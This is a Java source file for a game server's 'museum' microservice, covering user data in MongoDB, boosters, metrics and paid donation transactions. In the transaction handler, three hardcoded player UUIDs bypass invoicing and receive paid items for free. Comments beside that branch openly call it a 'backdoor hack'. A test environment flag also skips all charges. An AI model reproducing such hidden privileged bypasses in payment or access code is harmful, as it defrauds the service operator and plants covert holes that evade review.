package museum;

import com.google.common.collect.Maps;
import com.mongodb.async.client.MongoClient;
import com.mongodb.async.client.MongoClients;
import io.javalin.Javalin;
import io.netty.channel.Channel;
import museum.boosters.BoosterType;
import museum.configuration.ConfigurationManager;
import museum.data.BoosterInfo;
import museum.data.UserInfo;
import museum.donate.DonateType;
import museum.handlers.PackageHandler;
import museum.packages.*;
import museum.realm.RealmsController;
import museum.socket.ServerSocket;
import museum.socket.ServerSocketHandler;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.chat.ComponentSerializer;
import ru.cristalix.core.CoreApi;
import ru.cristalix.core.GlobalSerializers;
import ru.cristalix.core.coupons.CouponData;
import ru.cristalix.core.lib.Futures;
import ru.cristalix.core.microservice.MicroServicePlatform;
import ru.cristalix.core.microservice.MicroserviceBootstrap;
import ru.cristalix.core.network.ISocketClient;
import ru.cristalix.core.network.packages.*;
import ru.cristalix.core.permissions.IPermissionService;
import ru.cristalix.core.permissions.PermissionService;
import ru.cristalix.core.realm.RealmInfo;

import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.function.BiConsumer;
import java.util.function.BiPredicate;
import java.util.function.Function;
import java.util.stream.Collectors;

public class MuseumService {

	public static final long DEFAULT_BOOSTER_TIME = TimeUnit.HOURS.toMillis(1L);
	public static final int INCOME_MULTIPLIER = 10;
	public static String PASSWORD;
	@SuppressWarnings("rawtypes")
	public static final Map<Class<? extends MuseumPackage>, PackageHandler> HANDLER_MAP = new HashMap<>();
	private static final Map<DonateType, BiConsumer<UserTransactionPackage, UserInfo>> TRANSACTION_POST_AUTHORIZE_MAP
			= new HashMap<DonateType, BiConsumer<UserTransactionPackage, UserInfo>>() {{
		put(DonateType.GLOBAL_MONEY_BOOSTER, boosterPostAuthorize(BoosterType.COINS, true));
		put(DonateType.GLOBAL_EXP_BOOSTER, boosterPostAuthorize(BoosterType.EXP, true));
		put(DonateType.BOER, boosterPostAuthorize(BoosterType.BOER, true));
		put(DonateType.BIG_BOER, boosterPostAuthorize(BoosterType.BIG_BOER, true));
		put(DonateType.GLOBAL_VILLAGER_BOOSTER, boosterPostAuthorize(BoosterType.VILLAGER, true));
		put(DonateType.LOCAL_MONEY_BOOSTER, boosterPostAuthorize(BoosterType.COINS, false));
		put(DonateType.LOCAL_EXP_BOOSTER, boosterPostAuthorize(BoosterType.EXP, false));
	}};
	public static ConfigurationManager CONFIGURATION_MANAGER;

	public static UserDataMongoAdapter userData;
	public static MongoAdapter<BoosterInfo> globalBoosters;

	public static final Map<String, MuseumMetricsPackage> METRICS = Maps.newConcurrentMap();

	public static List<Subservice> subservices = new ArrayList<>();

	private static BoosterManager boosterManager;

	private static RealmsController realmsController;

	public static void main(String[] args) throws InterruptedException {
		System.setProperty("cristalix.core.net-context-limit", "655360");
		int museumServicePort;
		try {
			museumServicePort = Integer.parseInt(System.getenv("MUSEUM_SERVICE_PORT"));
		} catch (NumberFormatException | NullPointerException exception) {
			System.out.println("No MUSEUM_SERVICE_PORT environment variable specified!");
			Thread.sleep(1000);
			return;
		}

		PASSWORD = System.getenv("MUSEUM_SERVICE_PASSWORD");
		if (PASSWORD == null) {
			System.out.println("No MUSEUM_SERVICE_PASSWORD environment variable specified!");
			Thread.sleep(1000);
			return;
		}

		MicroserviceBootstrap.bootstrap(new MicroServicePlatform(2));
		CoreApi.get().registerService(IPermissionService.class, new PermissionService(ISocketClient.get()));

		ServerSocket serverSocket = new ServerSocket(museumServicePort);
		serverSocket.start();

		String dbUrl = System.getenv("db_url");
		String dbName = System.getenv("db_data");
		MongoClient client = MongoClients.create(dbUrl);
		userData = new UserDataMongoAdapter(client, dbName);
		globalBoosters = new MongoAdapter<>(client, dbName, "globalBoosters", BoosterInfo.class);

		boosterManager = new BoosterManager();
		subservices.add(boosterManager);

		realmsController = new RealmsController();

		CONFIGURATION_MANAGER = new ConfigurationManager("config.yml", "items.yml");
		CONFIGURATION_MANAGER.init();

		registerHandler(MuseumMetricsPackage.class, (channel, source, pckg) -> {
			System.out.println("Received metrics.");
			METRICS.put(pckg.getServerName(), pckg);
		});
		registerHandler(UserInfoPackage.class, (channel, source, pckg) -> {
			System.out.println("Received UserInfoPackage from " + source + " for " + pckg.getUuid().toString());

			userData.find(pckg.getUuid()).thenAccept(info -> {
				pckg.setUserInfo(info);
				answer(channel, pckg);
			});
		});
		registerHandler(DiscordUserInfoPackage.class, (channel, source, pckg) -> {
			if (Objects.equals(pckg.getDiscordID(), "")) {
				System.out.println("Received DiscordUserInfoPackage from " + source + " with null discordID");
				return;
			}
			System.out.println("Received DiscordUserInfoPackage from " + source + " for " + pckg.getDiscordID());

			userData.findDiscord(pckg.getDiscordID()).thenAccept(info -> {
				pckg.setUserInfo(info);
				answer(channel, pckg);
			});
		});
		registerHandler(SaveUserPackage.class, (channel, source, pckg) -> {
			System.out.println("Received SaveUserPackage from " + source + " for " + pckg.getUser().toString());
			userData.save(pckg.getUserInfo());
		});

		registerHandler(BulkSaveUserPackage.class, (channel, source, pckg) -> {
			System.out.println("Received BulkSaveUserPackage from " + source);
			userData.save(pckg.getPackages().stream().map(SaveUserPackage::getUserInfo).collect(Collectors.toList()));
		});

		registerHandler(UserTransactionPackage.class, (channel, source, pckg) -> {
			System.out.println("Received UserTransactionPackage from " + source);
			userData.find(pckg.getUser()).thenAccept(info -> {
				if (pckg.getDonate().isSave() && info.getDonates().contains(pckg.getDonate())) {
					pckg.setResponse(UserTransactionPackage.TransactionResponse.ALREADY_BUYED);
					answer(channel, pckg);
					return;
				}
				findCoupon(pckg.getUser()).thenAccept(data -> {
					int price = (int) (pckg.getDonate().getPrice() * 0.7); // *0.7
					if (data != null)
						price = (int) data.priceWithDiscount(price);
					// Делфику донат бесплатно бекдор взлом хак
					// Фанку донат бесплатно бэкдор взлом хэк
					// Годзиле донат бесплатно бэкдор взлом хэк
					if (
							pckg.getUser().equals(UUID.fromString("e7c13d3d-ac38-11e8-8374-1cb72caa35fd")) ||
									pckg.getUser().equals(UUID.fromString("307264a1-2c69-11e8-b5ea-1cb72caa35fd")) ||
											pckg.getUser().equals(UUID.fromString("80b910b4-5722-11ea-849b-1cb72caa35fd"))
					) {
						Optional.ofNullable(TRANSACTION_POST_AUTHORIZE_MAP.get(pckg.getDonate())).ifPresent(consumer -> consumer.accept(pckg, info));
						pckg.setResponse(UserTransactionPackage.TransactionResponse.OK);
						answer(channel, pckg);
					} else {
						processInvoice(pckg.getUser(), price, pckg.getDonate().getName()).thenAccept(response -> {
							UserTransactionPackage.TransactionResponse resp = UserTransactionPackage.TransactionResponse.OK;
							if (response.getErrorMessage() != null) {
								String err = response.getErrorMessage();
								if (err.equalsIgnoreCase("Недостаточно средств на счету"))
									resp = UserTransactionPackage.TransactionResponse.INSUFFICIENT_FUNDS;
								else {
									System.out.println(err);
									resp = UserTransactionPackage.TransactionResponse.INTERNAL_ERROR;
								}
							}
							if (resp == UserTransactionPackage.TransactionResponse.OK) {
								Optional.ofNullable(TRANSACTION_POST_AUTHORIZE_MAP.get(pckg.getDonate())).ifPresent(consumer -> consumer.accept(pckg, info));
							}
							pckg.setResponse(resp);
							answer(channel, pckg);
						});

					}
				});
			});
		});
		registerHandler(UserChatPackage.class, ((channel, serverName, museumPackage) -> {
			BroadcastMessagePackage messagePackage = new BroadcastMessagePackage(museumPackage.getJsonMessage());
			ServerSocketHandler.broadcast(messagePackage);
		}));
		registerHandler(UserBroadcastPackage.class, ((channel, serverName, museumPackage) -> {
			BroadcastTitlePackage broadcastPackage = new BroadcastTitlePackage(museumPackage.getData(), museumPackage.getFadeIn(), museumPackage.getStay(), museumPackage.getFadeOut());
			ServerSocketHandler.broadcast(broadcastPackage);
		}));
		registerHandler(ThanksExecutePackage.class, ((channel, serverName, museumPackage) -> {
			long boosters = boosterManager.executeThanks(museumPackage.getUser());
			userData.find(museumPackage.getUser()).thenAccept(data -> {
				extra(museumPackage.getUser(), data.getIncome() * INCOME_MULTIPLIER * boosters);
				museumPackage.setBoostersCount(boosters);
				answer(channel, museumPackage);
			});
		}));
		registerHandler(RequestConfigurationsPackage.class, ((channel, serverName, museumPackage) -> {
			CONFIGURATION_MANAGER.fillRequest(museumPackage);
			answer(channel, museumPackage);
		}));
		registerHandler(RequestGlobalBoostersPackage.class, ((channel, serverName, museumPackage) -> {
			museumPackage.setBoosters(new ArrayList<>(boosterManager.getGlobalBoosters()));
			answer(channel, museumPackage);
		}));
		registerHandler(TopPackage.class, ((channel, serverName, museumPackage) ->
				userData.getTop(museumPackage.getTopType(), museumPackage.getLimit()).thenAccept(res -> {
					museumPackage.setEntries(res);
					answer(channel, museumPackage);
				})));
		registerHandler(UserRequestJoinPackage.class, ((channel, serverName, museumPackage) -> {
			Optional<RealmInfo> realm = realmsController.bestRealm();
			boolean passed = false;
			if (realm.isPresent()) {
				passed = true;
				RealmInfo realmInfo = realm.get();
				realmInfo.setCurrentPlayers(realmInfo.getCurrentPlayers() + 1);
				ISocketClient.get().write(new TransferPlayerPackage(museumPackage.getUser(), realmInfo.getRealmId(), Collections.emptyMap()));
			}
			museumPackage.setPassed(passed);
			answer(channel, museumPackage);
		}));

		try {
			Javalin.create().get("/", ctx -> ctx.result(createMetrics())).start(Integer.parseInt(System.getenv("METRICS_PORT")));
		} catch (NumberFormatException | NullPointerException ignored) {
		}

		Thread consoleThread = new Thread(MuseumService::handleConsole);
		consoleThread.setDaemon(true);
		consoleThread.start();

	}

	private static void handleConsole() {
		Scanner scanner = new Scanner(System.in);
		scanner.useDelimiter("\n");
		while (true) {
			String s = scanner.next();
			String[] args = s.split(" ");
			if (s.equals("stop")) {
				System.exit(0);
				return;
			}
			if (s.equals("players")) {
				try {
					Map<UUID, UserInfo> uuidUserInfoMap = userData.findAll().get(5, TimeUnit.SECONDS);
					uuidUserInfoMap.forEach((k, v) -> System.out.println(k + ": " + GlobalSerializers.toJson(v)));
					System.out.println(uuidUserInfoMap.size() + " players in total.");
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			if (args[0].equals("delete")) {
				if (args.length < 2) System.out.println("Usage: delete [uuid]");
				else {
					if (args[1].equals("all")) {
						userData.findAll().thenAccept(map -> map.forEach(((uuid, userInfo) -> {
							userData.clear(uuid);
							System.out.println("Removed " + uuid);
						})));
					} else {
						UUID uuid = UUID.fromString(args[1]);
						userData.clear(uuid);
						System.out.println("Removed " + uuid + "'s data from db...");
					}
				}
			}
		}
	}

	/**
	 * Register handler to package type
	 *
	 * @param clazz   class of package
	 * @param handler handler
	 * @param <T>     package type
	 */
	private static <T extends MuseumPackage> void registerHandler(Class<T> clazz, PackageHandler<T> handler) {
		HANDLER_MAP.put(clazz, handler);
	}

	/**
	 * Send package to socket
	 *
	 * @param pckg package
	 */
	private static void answer(Channel channel, MuseumPackage pckg) {
		ServerSocketHandler.send(channel, pckg);
	}

	/**
	 * Алярм сообщением!
	 *
	 * @param components Чат компонент
	 */
	public static void alertMessage(BaseComponent[] components) {
		String json = ComponentSerializer.toString(components);
		ServerSocketHandler.broadcast(new BroadcastMessagePackage(json));
	}

	/**
	 * Алярм сообщением!
	 *
	 * @param message Сообщение строкой
	 */
	public static void alertMessage(String message) {
		alertMessage(TextComponent.fromLegacyText(message));
	}

	/**
	 * Алярм!
	 *
	 * @param title    Верхняя линия
	 * @param subTitle Нижняя линия
	 */
	public static void alert(String title, String subTitle) {
		alert(title, subTitle, 10, 100, 10);
	}

	/**
	 * Алярм!
	 *
	 * @param title    Верхняя линия
	 * @param subTitle Нижняя линия
	 * @param fadeIn   Время появления в тиках
	 * @param stay     Время нахождения на экране в тиках
	 * @param fadeOut  Время затухания в тиках
	 */
	public static void alert(String title, String subTitle, int fadeIn, int stay, int fadeOut) {
		ServerSocketHandler.broadcast(new BroadcastTitlePackage(new String[]{title, subTitle}, fadeIn, stay, fadeOut));
	}

	public static CompletableFuture<MoneyTransactionResponsePackage> processInvoice(UUID user, int price, String description) {
		if (System.getenv("TRANSACTION_TEST") != null)
			return CompletableFuture.completedFuture(new MoneyTransactionResponsePackage(null, null));
		return ISocketClient.get().writeAndAwaitResponse(new MoneyTransactionRequestPackage(user, price, true, description));
	}

	private static CompletableFuture<List<String>> wrapUuid(List<UUID> users) {
		FillLauncherUserDataPackage pc = new FillLauncherUserDataPackage();
		pc.setUuidList(users);
		return ISocketClient.get().<FillLauncherUserDataPackage>writeAndAwaitResponse(pc).thenApply(FillLauncherUserDataPackage::getUsernameList);
	}

	public static void extra(UUID user, Double sum) {
		ServerSocketHandler.broadcast(new ExtraDepositUserPackage(user, sum));
	}

	public static void asyncExtra(UUID user, Function<UserInfo, Double> supplier) {
		CompletableFuture.runAsync(() -> {
			try {
				UserInfo info = userData.find(user).get(4, TimeUnit.SECONDS);
				extra(user, supplier.apply(info));
			} catch (Exception e) {
				e.printStackTrace();
				CoreApi.get().getPlatform().getScheduler().runSyncDelayed(() -> {
					asyncExtra(user, supplier);
				}, 1, TimeUnit.SECONDS);
			}
		});
	}

	public static void sendMessage(Set<UUID> users, String message) {
		sendMessage(users, TextComponent.fromLegacyText(message));
	}

	public static void sendMessage(Set<UUID> users, BaseComponent[] message) {
		ServerSocketHandler.broadcast(new TargetMessagePackage(users, ComponentSerializer.toString(message)));
	}

	private static BiPredicate<UserTransactionPackage, UserInfo> localBoosterPreAuthorize(BoosterType type) {
		return (pckg, info) -> {
			try {
				return boosterManager.receiveLocal(pckg.getUser()).get(2L, TimeUnit.SECONDS).stream().noneMatch(booster -> booster.getType() == type);
			} catch (Exception ex) {
				ex.printStackTrace();
				return false;
			}
		};
	}

	private static BiConsumer<UserTransactionPackage, UserInfo> boosterPostAuthorize(BoosterType type, boolean global) {
		return (pckg, info) -> wrapUuid(Collections.singletonList(pckg.getUser())).thenApply(list -> list.get(0)).thenAccept(userName -> {
			boosterManager.push(BoosterInfo.defaultInstance(pckg.getUser(), userName, type, DEFAULT_BOOSTER_TIME, global));
		});
	}

	private static String createMetrics() {
		Map<String, MuseumMetricsPackage.PacketMetric> metrics = Maps.newHashMap();
		StringBuilder builder = new StringBuilder();
		METRICS.forEach((source, data) -> {
			builder.append("online{realm=\"").append(source).append("\"} ").append(data.getOnline()).append("\n");
			builder.append("tps{realm=\"").append(source).append("\"} ").append(data.getTps()).append("\n");
			builder.append("free_memory{realm=\"").append(source).append("\"} ").append(data.getFreeMemory()).append("\n");
			builder.append("allocated_memory{realm=\"").append(source).append("\"} ").append(data.getAllocatedMemory()).append("\n");
			builder.append("total_memory{realm=\"").append(source).append("\"} ").append(data.getTotalMemory()).append("\n");

			data.getMetrics().forEach((key, value) -> {
				metrics.compute(key, (__, old) -> {
					if (old != null) {
						old.setCompressedBytes(old.getCompressedBytes() + value.getCompressedBytes());
						old.setDecompressedBytes(old.getDecompressedBytes() + value.getDecompressedBytes());
						old.setReceived(old.getReceived() + value.getReceived());
						old.setReceivedBytes(old.getReceivedBytes() + value.getReceivedBytes());
						old.setSent(old.getSent() + value.getSent());
						old.setSentBytes(old.getSentBytes() + value.getSentBytes());
						return old;
					}
					return value.clone();
				});
			});
		});
		metrics.forEach((key, value) -> {
			builder.append("compressed_bytes{packet=\"").append(key).append("\"} ").append(value.getCompressedBytes()).append("\n");
			builder.append("decompressed_bytes{packet=\"").append(key).append("\"} ").append(value.getDecompressedBytes()).append("\n");
			builder.append("received{packet=\"").append(key).append("\"} ").append(value.getReceived()).append("\n");
			builder.append("received_bytes{packet=\"").append(key).append("\"} ").append(value.getReceivedBytes()).append("\n");
			builder.append("sent{packet=\"").append(key).append("\"} ").append(value.getSent()).append("\n");
			builder.append("sent_bytes{packet=\"").append(key).append("\"} ").append(value.getSentBytes()).append("\n");
		});
		return builder.toString();
	}

	private static CompletableFuture<CouponData> findCoupon(UUID user) {
		CompletableFuture<CouponData> future = new CompletableFuture<>();
		Futures.fail(Futures.timeout(
				ISocketClient.get().<CouponsDataPackage>writeAndAwaitResponse(new CouponsDataPackage(user)).thenAccept(pckg -> future.complete(pckg.getData())),
				5L, TimeUnit.SECONDS
		), throwable -> {
			throwable.printStackTrace();
			future.complete(null);
		});
		return future;
	}
}
